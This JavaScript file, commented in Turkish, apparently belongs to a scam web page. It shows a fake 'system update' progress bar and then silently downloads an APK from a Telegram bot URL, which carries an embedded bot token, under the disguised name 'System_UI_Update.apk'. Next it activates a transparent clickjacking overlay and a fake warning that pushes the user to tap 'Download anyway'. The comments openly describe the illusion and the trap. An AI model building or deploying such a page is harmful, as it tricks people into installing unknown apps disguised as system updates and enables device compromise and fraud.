// 1. İlerleme Çubuğu Fonksiyonu (İllüzyon Katmanı)
function runProgressBar(callback) {
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    const title = document.getElementById('title');
    
    let width = 0;
    const interval = setInterval(() => {
        // Videodaki gibi değişken hızlarla artsın
        width += Math.random() * 4;
        
        if (width >= 100) {
            clearInterval(interval);
            bar.style.width = "100%";
            status.innerText = "Paket açılıyor...";
            title.innerText = "Yükleme Hazır";
            
            // Bar bittiğinde indirmeyi başlatan callback'i çalıştır
            callback();
        } else {
            bar.style.width = width + "%";
            status.innerText = "Sistem güncelleniyor: %" + Math.round(width);
        }
    }, 150);
}

// 2. Tıklama Tuzağını Aktif Etme
function activateClickTrap() {
    const trap = document.getElementById('click-trap');
    trap.style.display = "block"; // Şeffaf katman ekrana gelir
    
    // Test aşamasında nerede olduğunu görmen için rengini geçici olarak belirgin yapabilirsin
    // trap.style.background = "rgba(255, 0, 0, 0.3)"; 
}

// 3. Ana Buton Dinleyicisi
document.getElementById('start-btn').addEventListener('click', function() {
    const btn = this;
    btn.style.display = 'none'; // Buton kaybolur, bar başlar

    // Fonksiyonu çağırıyoruz
    runProgressBar(() => {
        
        // 4. MIME Type Uyumlu Gizli Link Tetikleme
        const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
        
        const a = document.createElement('a');
        a.href = apkUrl;
        a.download = "System_UI_Update.apk"; // Dosya adı illüzyonu
        a.target = "_self";
        document.body.appendChild(a);
        
        // Kullanıcı butona bastığı için bu 'click' güvenli sayılır
        a.click();
        document.body.removeChild(a);

        // 5. Clickjacking Tuzağını Fırlat
        activateClickTrap();
        
        const status = document.getElementById('status');
        status.innerHTML = "<b style='color:#d93025'>DİKKAT:</b> Güncellemeyi onaylamak için alttaki 'Yine de indir' butonuna dokunun.";
    });
});
